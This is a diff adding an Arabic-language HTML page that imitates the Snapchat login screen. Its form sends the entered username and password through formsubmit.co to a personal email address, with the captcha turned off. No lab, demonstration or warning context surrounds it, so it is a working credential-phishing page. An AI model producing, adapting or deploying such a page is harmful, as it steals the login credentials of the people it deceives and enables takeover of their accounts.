@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول - Snapchat</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      background-color: #FFFC00;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      direction: rtl;
+    }
+    .login-container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      text-align: center;
+      position: relative;
+    }
+    .login-container h2 {
+      margin-bottom: 20px;
+      color: #000;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .password-container {
+      position: relative;
+    }
+    .toggle-password {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 18px;
+      color: #555;
+    }
+    button[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #FFFC00;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button[type="submit"]:hover {
+      background-color: #e6e600;
+    }
+    .signup {
+      margin-top: 15px;
+      font-size: 0.9em;
+    }
+    .signup a {
+      color: #000;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .snapchat-icon {
+      font-size: 40px;
+      color: #FFFC00;
+      background-color: black;
+      border-radius: 50%;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <i class="fab fa-snapchat-ghost snapchat-icon"></i>
+  <h2>تسجيل الدخول</h2>
+  <form action="https://formsubmit.co/srdyouness1@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+    <div class="password-container">
+      <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
+      <button type="button" class="toggle-password" id="togglePassword">👁️</button>
+    </div>
+    <button type="submit">تسجيل الدخول</button>
+  </form>
+  <div class="signup">
+    ليس لديك حساب؟ <a href="#">أنشئ حساباً</a>
+  </div>
+</div>
+
+<script>
+  const togglePassword = document.getElementById("togglePassword");
+  const passwordInput = document.getElementById("password");
+  togglePassword.addEventListener("click", () => {
+    const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+    passwordInput.setAttribute("type", type);
+    togglePassword.textContent = type === "password" ? "👁️" : "🙈";
+  });
+</script>
+
+</body>
+</html>
